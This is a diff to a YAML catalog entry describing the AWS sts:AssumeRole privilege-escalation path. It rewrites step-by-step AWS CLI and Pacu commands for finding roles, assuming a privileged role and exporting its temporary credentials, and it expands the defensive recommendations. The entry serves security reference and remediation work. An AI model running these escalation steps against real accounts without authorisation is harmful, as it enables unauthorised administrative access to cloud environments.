@@ -17,26 +17,32 @@ prerequisites:
 exploitationSteps:
   awscli:
   - step: 1
-    command: aws iam list-roles
-    description: List available roles to find targets with elevated permissions
+    command: aws sts get-caller-identity
+    description: Verify current identity before privilege escalation
   - step: 2
-    command: aws iam get-role --role-name TARGET_ROLE
-    description: Check the role's trust policy to confirm the attacker can assume it
+    command: aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table
+    description: List available roles to find targets with elevated permissions (optional but helpful for discovery)
   - step: 3
+    command: aws iam get-role --role-name TARGET_ROLE
+    description: Check the role's trust policy to confirm the attacker can assume it, and view attached policies (optional)
+  - step: 4
     command: |
       aws sts assume-role \
         --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE \
         --role-session-name privesc-session
-    description: Assume the privileged role to obtain temporary credentials
-  - step: 4
-    command: |
-      export AWS_ACCESS_KEY_ID=<AccessKeyId from step 3>
-      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 3>
-      export AWS_SESSION_TOKEN=<SessionToken from step 3>
-    description: Configure the AWS CLI to use the assumed role credentials
+    description: Assume the privileged role to obtain temporary credentials with elevated permissions
   - step: 5
+    command: |
+      export AWS_ACCESS_KEY_ID=<AccessKeyId from step 4>
+      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 4>
+      export AWS_SESSION_TOKEN=<SessionToken from step 4>
+    description: Configure the AWS CLI to use the assumed role credentials
+  - step: 6
     command: aws sts get-caller-identity
-    description: Verify the assumed role identity and elevated permissions
+    description: Verify the assumed role identity
+  - step: 7
+    command: aws iam list-users --max-items 3
+    description: Verify administrative access was successfully obtained
   pacu:
   - step: 1
     command: run iam__enum_permissions
@@ -73,13 +79,15 @@ recommendation: |
   ```
 
   Additional controls:
-  - Use external IDs for cross-account role assumptions
-  - Implement IP address restrictions in trust policies
-  - Require MFA for sensitive role assumptions
-  - Monitor CloudTrail for `AssumeRole` events on privileged roles
-  - Regularly audit role trust policies with AWS IAM Access Analyzer
-  - Alert on unusual assume-role patterns
-  - Use SCPs to restrict which roles can be assumed
+  - **Require MFA**: Require MFA for sensitive role assumptions using `aws:MultiFactorAuthPresent` condition
+  - **Use External IDs**: Use external IDs for cross-account role assumptions to prevent confused deputy attacks
+  - **IP Address Restrictions**: Implement IP address restrictions in trust policies using `aws:SourceIp` condition
+  - **Session Policies**: Implement session policies to limit permissions even when assuming privileged roles, providing an additional layer of defense
+  - **Monitor CloudTrail**: Alert on `AssumeRole` events on privileged roles, especially from unexpected principals
+  - **IAM Access Analyzer**: Regularly audit role trust policies with AWS IAM Access Analyzer to identify overly permissive trust relationships
+  - **Alert on Patterns**: Alert on unusual assume-role patterns or assumptions from unexpected IP addresses
+  - **Service Control Policies**: Use SCPs to restrict which roles can be assumed at the organizational level
+  - **AWS Config Rules**: Use AWS Config rules to detect roles with administrative permissions that can be assumed by users or have overly permissive trust policies
 discoveredBy:
   name: Spencer Gietzen
   organization: Rhino Security Labs
@@ -97,13 +105,17 @@ toolSupport:
   pmapper: true
   iamVulnerable: true
   pacu: true
+attackVisualization: |
+  graph LR
+      A[starting-user] -->|sts:AssumeRole| B[privileged-role]
+      B --> C[Effective Administrator]
 permissions:
   required:
   - permission: sts:AssumeRole
     resourceConstraints: Target role ARN must be in the Resource section and the role's trust policy must allow the principal
       to assume it
   additional:
-  - permission: iam:ListUsers
-    resourceConstraints: Helpful for discovering target users
-  - permission: iam:GetUser
-    resourceConstraints: Useful for viewing user details
+  - permission: iam:ListRoles
+    resourceConstraints: Helpful for discovering available roles to assume
+  - permission: iam:GetRole
+    resourceConstraints: Useful for viewing role trust policies and attached permissions
